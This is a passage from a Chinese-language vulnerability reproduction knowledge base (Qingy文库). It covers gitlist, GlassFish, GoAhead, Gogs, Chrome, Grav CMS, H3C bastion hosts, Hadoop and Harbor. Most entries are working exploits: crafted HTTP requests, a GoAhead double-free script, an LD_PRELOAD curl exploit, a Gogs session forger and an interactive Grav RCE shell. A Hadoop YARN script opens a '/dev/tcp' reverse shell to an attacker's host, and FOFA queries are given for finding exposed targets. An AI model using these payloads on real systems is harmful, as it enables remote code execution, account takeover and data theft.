这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）： -e The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by or. 当然，gitlist的开发者用了另一种修复方案： public function searchTree($query, $branch) { if (empty($query)) { return null; } $query = preg_replace('/(--?[A-Za-z0-9\\-]+)/', '', $query); $query = escapeshellarg($query); try { $results = $this->getClient()->run($this, \"grep -i --line-number -- {$query} $branch\"); } catch (\\RuntimeException $e) { return false; } 首先用preg_replace将-开头的非法字符移除，然后将$query放在--的后面。在命令行解析器中，--的意思是，此后的部分不会再包含参数选项（option）： A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --. If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash\\'s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script. 举个简单的例子，如果我们需要查看一个文件名是--name的文件，我们就不能用cat --name来读取，也不能用cat '--name'，而必须要用cat -- --name。从这个例子也能看出，单引号并不是区分一个字符串是\"参数值\"或\"选项\"的标准。3.png所以官方这个修复方案也是可以接受的，只不过第一步的preg_replace有点影响正常搜索功能。 漏洞复现 发送如下数据包： POST /example/tree/a/search HTTP/1.1 Host: www.0-sec.org:8080 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Length: 56 query=--open-files-in-pager=touch /tmp/success; 其中，我们访问的是/example/tree/a/search，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是\"grep -i --line-number {$query} $branch\"中的$branch，但因为我们的$query被当成了一个参数，所以$branch就应该被当做搜索的关键字。 如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了\"a\"这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。 数据包发送后，用docker-compose exec web bash进入容器中，可见/tmp/success已成功创建：4.png 参考链接 https://vulhub.org/\\#/environments/gitlist/0.6.0-rce/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:27 "},"Web安全/GlassFish/GlassFish 任意文件读取漏洞/GlassFish 任意文件读取漏洞.html":{"url":"Web安全/GlassFish/GlassFish 任意文件读取漏洞/GlassFish 任意文件读取漏洞.html","title":"GlassFish 任意文件读取漏洞","keywords":"","body":"GlassFish 任意文件读取漏洞 一、漏洞简介 java语言中会把%c0%ae解析为\\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。 二、漏洞影响 三、复现过程 编译、运行测试环境 docker-compose build docker-compose up -d 环境运行后，访问http://www.0-sec.org:8080和http://www.0-sec.org:4848即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。 访问https://www.0-sec.org:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd，发现已成功读取/etc/passwd内容： ps:本环境超级管理员密码在docker-compose.yml中设置，默认为vulhub_default_password，在4848端口利用该密码可以登录管理员账户。 参考链接 https://vulhub.org/\\#/environments/glassfish/4.1.0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:27 "},"Web安全/GoAhead/ （CVE-2019-5096） GoAhead远程代码溢出漏洞/ （CVE-2019-5096） GoAhead远程代码溢出漏洞 .html":{"url":"Web安全/GoAhead/ （CVE-2019-5096） GoAhead远程代码溢出漏洞/ （CVE-2019-5096） GoAhead远程代码溢出漏洞 .html","title":" （CVE-2019-5096） GoAhead远程代码溢出漏洞 ","keywords":"","body":"（CVE-2019-5096） 远程代码溢出漏洞 一、漏洞简介 GoAhead Web服务器最近被曝光在版本v5.0.1，v.4.1.1和v3.6.5中存在一个可利用的代码执行漏洞，漏洞存在http请求的multi-part/form-data字段处理中，若是发送畸形的HTTP请求，可导致GoAhead Web服务器在处理此请求期间触发double-free漏洞。 该畸形请求可以未经身份验证的GET或POST请求形式发送，并且请求的服务器上不需要存在web页面。 二、漏洞影响 v5.0.1，v.4.1.1和v3.6.5 三、复现过程 漏洞分析 漏洞曝光者给出了触发漏洞的源码： / src/upload.c / 66 static void freeUploadFile(WebsUpload *up) 67 { 68 if (up) { 69 if (up->filename) { // BUG: First UAF here 70 unlink(up->filename); // BUG: UAF/unlink - probably not a good idea 71 wfree(up->filename); // BUG: Double free here 72 } 73 74 wfree(up->clientFilename); 75 wfree(up->contentType); 76 wfree(up); 77 } 78 } 经过笔者的分析发现，freeUploadFile（）函数会在/src/upload.c的websFreeUpload（）函数中调用，而websFreeUpload（）函数会在/src/http.c中调用，/src/http.c中termWebs（）函数会调用websFreeUpload（）函数，/src/http.c中reuseConn（）函数会调用termWebs（）函数，从中可以看出漏洞触发函数freeUploadFile（）的调用过程。 在函数freeUploadFile（）的调用过程中，查看源码可发现有两行如下代码： / src/upload.c / 255 freeUploadFile(wp->currentFile); 256 file = wp->currentFile = walloc(sizeof(WebsUpload)); 在此处变量 wp->currentFile会被free一次，但是被free的变量wp->currentFile在代码： / src/upload.c / 371 hashEnter(wp->files, wp->uploadVar, valueSymbol(file), 0); 372 defineUploadVars(wp); 在此处代码中把变量wp->currentFile加入了一个数组中，该数组中的变量在接下来的代码中会被free一次，free代码如下： / src/upload.c / 86 for (s = hashFirst(wp->files); s; s = hashNext(wp->files, s)) { 87 up = s->content.value.symbol; 88 freeUploadFile(up); 变量wp->currentFile再次被free之后，导致了double-free漏洞触发，是fastbin double free，利用方法和思路已经很成熟。 poc https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit from pwn import * import time import sys r = remote(sys.argv[1],8080) rn = b\"\\r\\n\" payload=b'' payload +=b\"--siiit\"+rn payload +=b\"Content-Disposition: form-data; name=\\\"shit1\\\"; filename=\\\"shit.file\\\";\"+rn payload+= rn payload+=b\"HelloWorld!\"+rn payload +=b\"--siiit\"+rn payload +=b\"Content-Disposition: form-data; name=\\\"shit2\\\"; filename=\\\"shit2.file\\\"\"+rn payload+= rn payload+=b\"FuckkWorld!\"+rn payload +=b\"--siiit\"+rn data = b\"POST / HTTP/1.1\\r\\nHost:HelloWorld:8080\\r\\n\" data +=b\"content-type:multipart/form-data\"+rn data +=b\"content-type:boundary=siiit\"+rn data +=b\"content-length:\"+str(len(payload)).encode()+rn data +=b\"cookie:\"+b'a'*0x1+rn data +=rn data +=payload r.send(data) sleep(20) try: dat=r.recvn(1024) print(dat) r.close() except: r.close( Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:28 "},"Web安全/GoAhead/（CVE-2017-17562）GoAhead 远程命令执行漏洞/（CVE-2017-17562）GoAhead 远程命令执行漏洞.html":{"url":"Web安全/GoAhead/（CVE-2017-17562）GoAhead 远程命令执行漏洞/（CVE-2017-17562）GoAhead 远程命令执行漏洞.html","title":"（CVE-2017-17562）GoAhead 远程命令执行漏洞","keywords":"","body":"（CVE-2017-17562）GoAhead 远程命令执行漏洞 一、漏洞简介 GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。 我们可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给http://www.0-sec.org/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。 二、漏洞影响 GoAhead 3.6.5之前的版本（2.5.0 -- 3.6.4） 三、复现过程 启动漏洞环境： docker-compose up -d 启动完成后，访问http://your-ip:8080/即可看到欢迎页面。访问http://your-ip:8080/cgi-bin/index即可查看到Hello页面，即为CGI执行的结果。 漏洞复现 我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在Linux x86_64的机器中，所以我们直接用Linux PC编译即可。动态链接库源码： #include static void before_main(void) __attribute__((constructor)); static void before_main(void) { write(1, \"Hello: World!\\n\", 14); } 这样，before_main函数将在程序执行前被调用。编译以上代码： gcc -shared -fPIC ./payload.c -o payload.so 将payload.so作为post body发送： curl -X POST --data-binary @payload.so \"http://www.0-sec.org:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\" -i 可见，Hello: world!已被成功输出，说明我们的动态链接库中的代码已被执行：GoAhead远程命令执行漏洞/media/rId25.png)编译一个反弹shell的代码，成功反弹shell：GoAhead远程命令执行漏洞/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:28 "},"Web安全/Gogs/（CVE-2018-18925）Gogs 任意用户登录漏洞/（CVE-2018-18925）Gogs 任意用户登录漏洞.html":{"url":"Web安全/Gogs/（CVE-2018-18925）Gogs 任意用户登录漏洞/（CVE-2018-18925）Gogs 任意用户登录漏洞.html","title":"（CVE-2018-18925）Gogs 任意用户登录漏洞","keywords":"","body":"（CVE-2018-18925）Gogs 任意用户登录漏洞 一、漏洞简介 gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。 其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。 二、漏洞影响 Gogs \\ 三、复现过程 执行如下命令启动gogs： docker-compose up -d 环境启动后，访问http://your-ip:3000，即可看到安装页面。安装时选择sqlite数据库，并开启注册功能。 安装完成后，需要重启服务：docker-compose restart，否则session是存储在内存中的。 漏洞利用 使用Gob序列化生成session文件： package main import ( \"bytes\" \"encoding/gob\" \"encoding/hex\" \"fmt\" \"io/ioutil\" \"os\" ) func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) { for _, v := range obj { gob.Register(v) } buf := bytes.NewBuffer(nil) err := gob.NewEncoder(buf).Encode(obj) return buf.Bytes(), err } func main() { var uid int64 = 1 obj := map[interface{}]interface{}{\"_old_uid\": \"1\", \"uid\": uid, \"uname\": \"root\"} data, err := EncodeGob(obj) if err != nil { fmt.Println(err) } err = ioutil.WriteFile(\"data\", data, os.O_CREATE|os.O_WRONLY) if err != nil { fmt.Println(err) } edata := hex.EncodeToString(data) fmt.Println(edata) } 然后注册一个普通用户账户，创建项目，并在\"版本发布\"页面上传刚生成的session文件： Gogs任意用户登录漏洞/media/rId25.png) 通过这个附件的URL，得知这个文件的文件名：./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10。 然后，构造Cookie：i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10，访问即可发现已经成功登录id=1的用户（即管理员）： Gogs任意用户登录漏洞/media/rId26.png) 完整的利用过程与原理，可以阅读参考链接中的文章。 参考链接 https://vulhub.org/\\#/environments/gogs/CVE-2018-18925/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:29 "},"Web安全/Google/（CVE-2019-5786）Chrome 远程代码执行漏洞/（CVE-2019-5786）Chrome 远程代码执行漏洞.html":{"url":"Web安全/Google/（CVE-2019-5786）Chrome 远程代码执行漏洞/（CVE-2019-5786）Chrome 远程代码执行漏洞.html","title":"（CVE-2019-5786）Chrome 远程代码执行漏洞","keywords":"","body":"（CVE-2019-5786）Chrome 远程代码执行漏洞 一、漏洞简介 攻击者利用该漏洞配合一个win32k.sys的内核提权（CVE-2019-0808 ）可以在win7上穿越Chrome沙箱 二、漏洞影响 72.0.3626.121或更高版本 三、复现过程 测试环境为： win7 x86 谷歌浏览器版本为72.0.3626.119 Chrome远程代码执行漏洞/media/rId24.png) 这里看一下参数说明 Chrome远程代码执行漏洞/media/rId25.png) 设置lhost为我们的本机ip Chrome远程代码执行漏洞/media/rId26.png) 执行exploit之后，会返回一个链接 Chrome远程代码执行漏洞/media/rId27.png) 只要被攻击者访问了这个链接，就会触发漏洞，返回session image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:30 "},"Web安全/Google/（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞/（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞.html":{"url":"Web安全/Google/（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞/（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞.html","title":"（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞","keywords":"","body":"（CVE-2020-6404）Google Chrome Blink 缓冲区错误漏洞 一、漏洞简介 在80.0.3987.87之前的Google Chrome中，Blink中的不当实现使远程攻击者有可能通过精心制作的HTML页面利用堆破坏。 二、漏洞影响 Google Chrome 80.0.3987.87 三、复现过程 poc document.addEventListener(\"DOMContentLoaded\", function(){ find(decodeURIComponent('\\uFFFC')); }); GoogleChromeBlink缓冲区错误漏洞/media/rId25.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:32 "},"Web安全/Google/（CVE-2020-6418）Chrome 远程代码执行漏洞/（CVE-2020-6418）Chrome 远程代码执行漏洞.html":{"url":"Web安全/Google/（CVE-2020-6418）Chrome 远程代码执行漏洞/（CVE-2020-6418）Chrome 远程代码执行漏洞.html","title":"（CVE-2020-6418）Chrome 远程代码执行漏洞","keywords":"","body":"（CVE-2020-6418）Chrome 远程代码执行漏洞 一、漏洞简介 在Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中，开源JavaScript和WebAssembly引擎V8中存在一个类型混淆漏洞（CVE-2020-6418），可能导致攻击者非法访问数据，从而执行恶意代码。 二、漏洞影响 Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中 三、复现过程 poc ITERATIONS = 10000 TRIGGER = false function f(a,p){ return a.pop(Reflect.construct(function(){}, arguments, p)) } let a; let p = new Proxy(Object, { get: function(){ if (TRIGGER){ a[2] = 1.1; } return Object.prototype; } }); for(let i = 0; i CVE-2020-6418 PoC! 参考链接 https://github.com/ChoKyuWon/CVE-2020-6418/blob/master/poc.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:33 "},"Web安全/Grav CMS/Grav CMS 1.7.10 模版注入漏洞/Grav CMS 1.7.10 模版注入漏洞.html":{"url":"Web安全/Grav CMS/Grav CMS 1.7.10 模版注入漏洞/Grav CMS 1.7.10 模版注入漏洞.html","title":"Grav CMS 1.7.10 模版注入漏洞","keywords":"","body":"Grav CMS 1.7.10 模版注入漏洞 漏洞描述 Grav是一套可扩展的用于个人博客、小型内容发布平台和单页产品展示的CMS（内容管理系统）。Grav 存在代码注入漏洞，攻击者可利用该漏洞任意代码执行和提升实例上的特权。 漏洞影响 Grav CMS 1.7.10 FOFA title=\"Grav\" POC PoC.py: #!/usr/bin/python import requests from bs4 import BeautifulSoup import random import string username = 'username' password = 'password' url = 'http://grav.local' session = requests.Session() # Autheticating ## Getting login-nonce def login(url,username,password): r = session.get(url + \"/admin\") soup = BeautifulSoup(r.text, features=\"lxml\") nonce = str(soup.findAll('input')[2]) nonce = nonce[47:79] ## Logging in payload =f'data%5Busername%5D={username}&data%5Bpassword%5D={password}&task=login&login-nonce={nonce}' headers = {'Content-Type': 'application/x-www-form-urlencoded'} r = session.post(url+\"/admin\",data=payload,headers=headers) # Creating Page for RCE def rce(url,cmd): ## Getting form nonce and unique form id project_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)) r = session.get(url+f\"/admin/pages/{project_name}/:add\") soup = BeautifulSoup(r.text, features=\"lxml\") nonce = str(soup.findAll('input')[72]) form_id = str(soup.findAll('input')[71]) form_id = form_id[54:86] nonce = nonce[46:78] ## Creating Page headers = {'Content-Type': 'application/x-www-form-urlencoded'} payload = f'task=save&data%5Bheader%5D%5Btitle%5D={project_name}&data%5Bcontent%5D=%7B%7B+system%28%27{cmd}%27%29+%7D%7D&data%5Bfolder%5D={project_name}&data%5Broute%5D=&data%5Bname%5D=default&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&toggleable_data%5Bheader%5D%5Bprocess%5D=on&data%5Bheader%5D%5Bprocess%5D%5Btwig%5D=1&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={form_id}&form-nonce={nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&data%5Bheader%5D%5Bprocess%5D%5Bmarkdown%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0' r = session.post(url+f\"/admin/pages/{project_name}/:add\",data=payload,headers=headers) ## Getting command output r = session.get(url+f\"/{project_name.lower()}\") if 'SyntaxError' in r.text: print(\"[-] Command error\") else: a = r.text.split('') b = a[1].split('') print(b[0][58:]) # Cleaning up ## Getting admin-nonce r = session.get(url + \"/admin/pages\") soup = BeautifulSoup(r.text, features=\"lxml\") nonce = str(soup.findAll('input')[32]) nonce = nonce[47:79] ## Deleting Page r = session.get(url+f\"/admin/pages/{project_name.lower()}/task:delete/admin-nonce:{nonce}\") login(url,username,password) while True: cmd = input(\"$ \") rce(url,cmd) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:33 "},"Web安全/H3C SecParh堡垒机/H3C IMC dynamiccontent.properties.xhtm 远程命令执行/H3C IMC dynamiccontent.properties.xhtm 远程命令执行.html":{"url":"Web安全/H3C SecParh堡垒机/H3C IMC dynamiccontent.properties.xhtm 远程命令执行/H3C IMC dynamiccontent.properties.xhtm 远程命令执行.html","title":"H3C IMC dynamiccontent.properties.xhtm 远程命令执行","keywords":"","body":"H3C IMC dynamiccontent.properties.xhtm 远程命令执行 漏洞描述 H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行 漏洞影响 H3C IMC FOFA \"/imc/login.jsf\" && body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" 漏洞复现 登录页面为 发送如下请求包 POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1564 pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:34 "},"Web安全/H3C SecParh堡垒机/H3C SecParh 堡垒机data_provider.php远程命令执行漏洞/H3C SecParh 堡垒机data_provider.php远程命令执行漏洞.html":{"url":"Web安全/H3C SecParh堡垒机/H3C SecParh 堡垒机data_provider.php远程命令执行漏洞/H3C SecParh 堡垒机data_provider.php远程命令执行漏洞.html","title":"H3C SecParh 堡垒机data_provider.php远程命令执行漏洞","keywords":"","body":"H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞 漏洞描述 H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令 漏洞影响 H3C SecParh堡垒机 FOFA app=\"H3C-SecPath-运维审计系统\" && body=\"2018\" 漏洞复现 登录页面如下 先通过任意用户登录获取Cookie /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:35 "},"Web安全/H3C SecParh堡垒机/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞.html":{"url":"Web安全/H3C SecParh堡垒机/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞/H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞.html","title":"H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞","keywords":"","body":"H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞 漏洞描述 H3C SecParh堡垒机 get_detail_view.php 存在任意用户登录漏洞 与齐治堡垒机出现的漏洞相似 漏洞影响 H3C SecParh堡垒机 FOFA app=\"H3C-SecPath-运维审计系统\" && body=\"2018\" 漏洞复现 POC验证的Url为 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin 成功获取admin权限 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:36 "},"Web安全/Hadoop/Hadoop未授权访问/Hadoop未授权访问.html":{"url":"Web安全/Hadoop/Hadoop未授权访问/Hadoop未授权访问.html","title":"Hadoop未授权访问","keywords":"","body":"Hadoop未授权访问 一、漏洞简介 Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理： 用户创建一个处理键值的map函数 产生了一套中间键/值 reduce函数合并中间值并把他们关联到对应的键 二、影响范围 三、复现过程 1. 扫描探测 1.1 常见端口 1.2 敏感端口 模块 节点 默认端口 HDFS NameNode 50070 HDFS SecondNameNode 50090 HDFS DataNode 50075 HDFS Backup/Checkpoint node 50105 MapReduce JobTracker 50030 MapReduce TaskTracker 50060 通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。 2. 攻击手法 利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 REST API 也可以提交任务执行。 利用过程如下： 在本地监听等待反弹 shell 连接 调用 New Application API 创建 Application 调用 Submit Application API 提交 P牛的攻击脚本 ##!/usr/bin/env python import requests target = 'http://127.0.0.1:8088/' lhost = '192.168.0.1' ## put your local host ip here, and listen at port 9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3. 防范措施 网络访问控制 使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。 启用认证功能 启用 Kerberos 认证功能。 更新补丁 不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:37 "},"Web安全/Harbor/（CVE-2019-16097）Harbor未授权创建管理员漏洞/（CVE-2019-16097）Harbor未授权创建管理员漏洞.html":{"url":"Web安全/Harbor/（CVE-2019-16097）Harbor未授权创建管理员漏洞/（CVE-2019-16097）Harbor未授权创建管理员漏洞.html","title":"（CVE-2019-16097）Harbor未授权创建管理员漏洞","keywords":"","body":"（CVE-2019-16097）Harbor未授权创建管理员漏洞 一、漏洞简介 近日，镜像仓库Harbor爆出任意管理员注册漏洞，攻击者在请求中构造特定字符串，在未授权的情况下可以直接创建管理员账号，从而接管Harbor镜像仓库。我们得到消息，第一时间对该漏洞进了验证，官方已发布公告说明，最新的1.7.6和1.8.3已修复此漏洞，请使用到的用户尽快升级至安全版本。 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。 二、影响范围 Harbor 1.7.0版本至1.8.2 三、复现过程 https://github.com/ianxtianxt/CVE-2019-1609 Qingy文库 all right reserved，powered by GitbookFile 